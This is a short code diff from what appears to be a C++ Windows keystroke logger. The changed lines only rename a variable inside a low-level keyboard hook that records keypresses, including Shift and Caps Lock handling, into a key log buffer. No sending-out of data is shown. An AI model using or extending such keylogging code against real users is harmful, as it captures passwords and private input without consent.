@@ -11,10 +11,10 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
   if (nCode < 0) {
 	CallNextHookEx(hook, nCode, wParam, lParam);
   }
-  auto *pKbdllHookStruct = (KBDLLHOOKSTRUCT *)lParam;
+  auto *pKbDllHookStruct = (KBDLLHOOKSTRUCT *)lParam;
 
   if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-	DWORD key = pKbdllHookStruct->vkCode;
+	DWORD key = pKbDllHookStruct->vkCode;
 	if (key == VK_CAPITAL) {
 	  caps = !caps;
 	  if (!caps) {
@@ -38,10 +38,10 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 	keyLog.clear();
   }
 
-  if (pKbdllHookStruct->vkCode == VK_RETURN) {
+  if (pKbDllHookStruct->vkCode == VK_RETURN) {
 	keyLog += '\n';
   } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-	DWORD key = pKbdllHookStruct->vkCode;
+	DWORD key = pKbDllHookStruct->vkCode;
 	if (key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT) {
 	  shift = false;
 	}
@@ -58,7 +58,7 @@ LRESULT KeyHook::RunHook(int nCode, WPARAM wParam, LPARAM lParam) {
 		|| key == VK_SHIFT
 		|| key == VK_RSHIFT
 		|| key == VK_LSHIFT) {
-	  std::string key_name = KeyConst::AddKey(pKbdllHookStruct->vkCode, caps, shift);
+	  std::string key_name = KeyConst::AddKey(pKbDllHookStruct->vkCode, caps, shift);
 	  if (key_name.length() > 0) {
 		key_name.insert(1, "/");
 	  }
